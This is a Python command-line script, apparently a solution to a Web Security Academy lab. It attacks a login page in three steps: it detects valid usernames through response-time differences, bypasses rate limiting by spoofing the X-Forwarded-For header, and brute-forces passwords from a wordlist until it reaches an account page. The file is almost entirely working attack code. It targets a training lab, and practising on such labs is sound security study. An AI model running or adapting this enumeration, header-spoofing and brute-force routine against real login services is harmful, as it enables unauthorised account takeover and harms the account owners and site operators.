from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import track
from rich.progress import Progress


console = Console()
app = typer.Typer()

@app.command()
def run(usernames_file: Path, passwords_file: Path, server: str = typer.Option(default=...)):
    with open(usernames_file) as f:
        usernames = [line.strip() for line in f.readlines()]
    with open(passwords_file) as f:
        passwords = [line.strip() for line in f.readlines()]

    PASSWORD="f4da7d0d-831f-4d5d-9103-098538f67637f4da7d0d-831f-4d5d-9103-098538f67637f4da7d0d-831f-4d5d-9103-098538f67637f4da7d0d-831f-4d5d-9103-098538f67637"
    VALID_USERNAME='wiener'
    SERVER = f"https://{server}.web-security-academy.net"

    possible_target_usernames=[]

    correct_username_response_time=0.
    with Progress(transient=True) as progress:
        task = progress.add_task("[green]Calcuating request elapsed time for an exisiting username (wiener)...", total=1)
        response = requests.post(
            f"{SERVER}/login",
            data={
                "username": VALID_USERNAME,
                "password": PASSWORD,
            },
            headers={
                "X-Forwarded-For": VALID_USERNAME,
            }
        )
        while not progress.finished:
            progress.update(task, advance=1)
            progress.refresh()
        #console.log(response.text)
        if response.status_code == HTTPStatus.OK:
            correct_username_response_time=response.elapsed.total_seconds()
            console.log(f"Elapsed time: {response.elapsed.total_seconds()}")
        else:
            console.log(f"Problem on connection response status: {response}")
            exit(1)

    console.log("Brute-forcing usernames...")

    for username in track(usernames, description="Brute-forcing usernames...", console=console):
        console.log(f"Currently checked: {username}")
        response = requests.post(
            f"{SERVER}/login",
            data={
                "username": username,
                "password": PASSWORD,
            },
            headers={
                "X-Forwarded-For": username,
            }
        )
        if response.status_code == HTTPStatus.OK:
            if response.elapsed.total_seconds() >= correct_username_response_time - 0.6:
                print(f"*******************This username could be a target: {username} ****************************")
                possible_target_usernames.append(username)

    console.log("Brute-forcing passwords for target usernames...")

    for username in possible_target_usernames:
        console.log(f"Currently checked: {username}")
        for password in track(passwords, description=f"Passwords for {username}...", console=console):
            console.log(f"Currently checked: {username}:{password}")
            response = requests.post(
                f"{SERVER}/login",
                data={
                    "username": username,
                    "password": password,
                },
                headers={
                    "X-Forwarded-For": password,
                }
            )
            if response.status_code == HTTPStatus.OK:
                    html_document = html.fromstring(response.content)
                    title = html_document.xpath("//h1")[0].text
                    if title == "My Account":
                        console.log(f'******************************** Credentials found: {username}:{password} ************************************')
                        exit(0)






if __name__ == "__main__":
    app()